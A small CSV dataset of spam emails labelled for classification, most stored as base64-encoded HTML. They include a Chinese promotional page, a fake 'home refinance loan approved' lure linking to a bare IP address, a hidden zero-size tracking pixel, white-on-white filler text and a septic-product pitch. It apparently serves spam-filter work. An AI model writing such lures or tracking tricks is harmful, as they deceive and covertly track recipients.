spam_label,text,text_cleaned
1,PGh0bWw+DQoNCjxoZWFkPg0KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1MYW5ndWFnZSIgY29u dGVudD0iemgtdHciPg0KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0 ZXh0L2h0bWw7IGNoYXJzZXQ9YmlnNSI+DQo8bWV0YSBuYW1lPSJHRU5FUkFUT1IiIGNvbnRlbnQ9 Ik1pY3Jvc29mdCBGcm9udFBhZ2UgNC4wIj4NCjxtZXRhIG5hbWU9IlByb2dJZCIgY29udGVudD0i RnJvbnRQYWdlLkVkaXRvci5Eb2N1bWVudCI+DQo8dGl0bGU+wLC5TLNcpmikSKRds1ynQaW/u92t bjwvdGl0bGU+DQo8L2hlYWQ+DQoNCjxib2R5IGJnY29sb3I9IiNGRjk5MDAiIGJhY2tncm91bmQ9 ImNpZDouLi9VU0VSL0hPTUVQQUdFL1dHSUYvQkcwMy5HSUYiPg0KDQo8cCBzdHlsZT0ibWFyZ2lu LXRvcDogMDsgbWFyZ2luLWJvdHRvbTogMCI+PGZvbnQgY29sb3I9IiMwMDAwRkYiPrNvrE+pZbBV pdGxTbd+vHOnaaS9pXGlTrVvpMWqvbG1pl6rSLVMqmuxtaasICAgICANCsvnIH4gITwvZm9udD48 L3A+ICAgIA0KDQo8aHIgc2l6ZT0iMSI+DQo8ZGl2IGFsaWduPSJjZW50ZXIiPg0KICA8Y2VudGVy Pg0KICA8dGFibGUgYm9yZGVyPSIwIiB3aWR0aD0iNjA2IiBoZWlnaHQ9IjM2NSIgY2VsbHNwYWNp bmc9IjAiIGNlbGxwYWRkaW5nPSIwIiBzdHlsZT0iYm9yZGVyOiAyIGRvdHRlZCAjRkY5OTMzIj4N CiAgICA8dHI+DQogICAgICA8dGQgd2lkdGg9IjYwMCIgaGVpZ2h0PSIzNjUiIHZhbGlnbj0ibWlk ZGxlIiBhbGlnbj0iY2VudGVyIiBiZ2NvbG9yPSIjMDBDQzAwIj4NCiAgICAgICAgPHAgYWxpZ249 ImxlZnQiPjxmb250IGNvbG9yPSIjMDAwMGZmIj4mbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJz cDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsm bmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJz cDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsm bmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJz cDsmbmJzcDsgICANCiAgICAgICAgr9S7fqdBtFis7cTBoUHBQbjRpECt0773t3yhSaFJPC9mb250 PjwvcD4NCiAgICAgICAgPHAgYWxpZ249ImxlZnQiPjxmb250IGNvbG9yPSIjMDAwMGZmIj4mbmJz cDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsm bmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJz cDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsgICANCiAgICAgICAgsnuktarA t3ykaq5hs6OmYqfkvve3fKFBpv2+97d8qNOuyadBr3WquqzdqOykRrbcJm5ic3A7Jm5ic3A7Jm5i c3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7PC9mb250PjwvcD4NCiAgICAgICAgPHAgYWxpZ249ImxlZnQi Pjxmb250IGNvbG9yPSIjMDAwMGZmIj4mbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJz cDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsm bmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJz cDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsm bmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsgICANCiAgICAg ICAgpFWkQK3Tpb+9VKq6qE2pdzwvZm9udD48YSBocmVmPSJodHRwOi8va2trLmg4aC5jb20udHci Pjxmb250IGNvbG9yPSIjZmYwMDAwIj7CSaRVpUw8L2ZvbnQ+PGZvbnQgY29sb3I9IiMwMDAwZmYi PqdhPC9mb250PjwvYT48Zm9udCBjb2xvcj0iIzAwMDBmZiI+oUmhSTwvZm9udD48L3A+DQogICAg ICAgIDxwIGFsaWduPSJsZWZ0Ij48Zm9udCBjb2xvcj0iI2ZmZmZmZiI+Jm5ic3A7Jm5ic3A7Jm5i c3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7 ICAgDQogICAgICAgIKRdvdCxeqtPr2SmuavKRS1tYWlsJm5ic3A7Jm5ic3A7PC9mb250PjwvcD4N CiAgICAgICAgPHByZT48Zm9udCBzaXplPSIzIj6kXb3QsXqrT69kprmrykUtbWFpbDwvZm9udD48 L3ByZT4NCiAgICAgICAgPHByZT48Zm9udCBzaXplPSIzIj4gICAgvdCxerDIpbKs3ae5prk8YSBo cmVmPSJodHRwOi8va2trLmg4aC5jb20udHciPr73t3y8dqT5PC9hPqvhpkGnUrCjPC9mb250Pjwv cHJlPg0KICAgICAgICA8cD6hQDwvcD4NCiAgICAgICAgPHAgYWxpZ249ImxlZnQiPjxmb250IGNv bG9yPSIjMDAwMGZmIj4mbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsm bmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJz cDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsm bmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsgICAN CiAgICAgICAgs8yr4a+ssXqhRzwvZm9udD48L3A+DQogICAgICAgIDxwIGFsaWduPSJsZWZ0Ij48 Zm9udCBjb2xvcj0iIzAwMDBmZiI+Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7 Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5i c3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7 Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5i c3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7 Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5i c3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7ICAgDQogICAgICAg IKTft1GoxqaoJm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7ILhVqMamcLdOPC9m b250PjwvcD4gIA0KICAgICAgICA8cD6hQDwvdGQ+DQogICAgPC90cj4NCiAgPC90YWJsZT4NCiAg PC9jZW50ZXI+DQo8L2Rpdj4NCjxociBzaXplPSIxIj4NCjxwIGFsaWduPSJjZW50ZXIiIHN0eWxl PSJtYXJnaW4tdG9wOiAwOyBtYXJnaW4tYm90dG9tOiAwIj48Zm9udCBjb2xvcj0iI0ZGMDAwMCI+ pnCms6W0wlq90KijvcyhQaSjt1GmQaasqOymuatIvdCr9iZuYnNwOyAgICAgDQotJmd0OyZuYnNw OyAoPGEgaHJlZj0iaHR0cDovL3gtbWFpbC5oOGguY29tLnR3IiB0YXJnZXQ9Il9ibGFuayI+qdqm rLxzp2k8L2E+KTwvZm9udD48L3A+ICAgDQoNCjwvYm9keT4NCg0KPC9odG1sPg==,
1,PGh0bWw+DQo8Ym9keT4NCjxmb250IGNvbG9yPSJmZmZmZmYiPm1hcnRpbmV6 PC9mb250Pg0KPHA+WW91ciBob21lIHJlZmluYW5jZSBsb2FuIGlzIGFwcHJv dmVkITxicj48L3A+PGJyPg0KPHA+VG8gZ2V0IHlvdXIgYXBwcm92ZWQgYW1v dW50IDxhIGhyZWY9Imh0dHA6Ly8yMDAuMzIuMy4xMjEvaW5kZXguaHRtIj5n bw0KaGVyZTwvYT4uPC9wPg0KPGJyPjxicj48YnI+PGJyPjxicj48YnI+PGJy Pjxicj48YnI+PGJyPjxicj48YnI+PGJyPjxicj48YnI+PGJyPjxicj48YnI+ PGJyPg0KPHA+VG8gYmUgZXhjbHVkZWQgZnJvbSBmdXJ0aGVyIG5vdGljZXMg PGEgaHJlZj0iaHR0cDovLzIwMC4zMi4zLjEyMS9yZW1vdmUuaHRtbCI+Z28N CmhlcmU8L2E+LjwvcD4NCjxmb250IGNvbG9yPSJmZmZmZmYiPm1hcnRpbmV6 PC9mb250Pg0KPC9ib2R5Pg0KPGZvbnQgY29sb3I9ImZmZmZmZiI+MWdhdGUN CjwvaHRtbD4NCjA0NTRZdlFEOC00NjdCWllDMjYyMHhIemc2LTk2bDI3,
1,<html><body><IMG SRC='http://master2.free4all.com/cgi-bin/sp/t.pl?id=7:56446664&o=1&d=1' BORDER=0 WIDTH=0 HEIGHT=0/> <center><img src=http://www.vitafactory.com/ad-friday/test.gif border=0> </body></html>,
1,SWYgeW91ciBob21lIGlzIHNlcnZlZCBieSBhIHNlcHRpYyBzeXN0ZW0sIHlv dSB3aWxsIGJlIGFibGUgdG8gcmVjZWl2ZQ0KaW52YWx1YWJsZSBpbmZvcm1h dGlvbiBvbiBob3cgdG8gZWxpbWluYXRlIHB1bXAgb3V0cywgbWFpbnRhaW4g dGhlDQpzeXN0ZW0gcHJvcGVybHkgYW5kIGN1cmUgcHJvYmxlbXMgc3VjaCBh cyBiYWNrdXBzLCB3ZXQgc3BvdHMsIG9kb3IsIGV0Yy4NCg0KWW91IGNhbiBk byB0aGlzIGJ5IGNoZWNraW5nIG91dCBvdXIgU1BDIHByb2dyYW0gYXQ6DQoN Cmh0dHA6Ly93d3cuYmxhY2tzbm93Y2xvdWQuY29tDQoNCkluIGFkZGl0aW9u LCB5b3Ugd2lsbCBoYXZlIHRoZSBvcHBvcnR1bml0eSB0byBwYXJ0aWNpcGF0 ZSBpbiBhIGZyZWUNCnRyaWFsIHRvIHRlc3QgdGhlIGVmZmVjdGl2ZW5lc3Mg b2YgU1BDLg0KDQpQbGVhc2UgY2hlY2sgdXMgb3V0Lg0KDQpUaGFuayB5b3Uu DQoNClNpbmNlcmVseSwNCg0KU1BDDQoNClAuUy4gUmVtZW1iZXIsIHlvdSBt dXN0IGNsaWNrIG9uIHRoaXMgbGluayB0byByZWNlaXZlIHRoaXMgaGVscGZ1 bA0KaW5mb3JtYXRpb24hDQoNCmh0dHA6Ly93d3cuYmxhY2tzbm93Y2xvdWQu Y29tDQoNCg0KDQpUbyBiZSByZW1vdmVkIGZyb20gb3VyIGVtYWlsIGxpc3Qg cGxlYXNlIGNsaWNrIG9uIHRoZSBsaW5rIGJlbG93Lg0KaHR0cDovL3d3dy5i bGFja3Nub3djbG91ZC5jb20vcmVtb3ZlLmh0bWwNCg0KNzEyM3JLUko5LTI4 NHpvV1Q5MzIyT1FKcDktMTg3TUNXbzg4NzhWWmxKNy0zNzl5bDQ1DQo=,
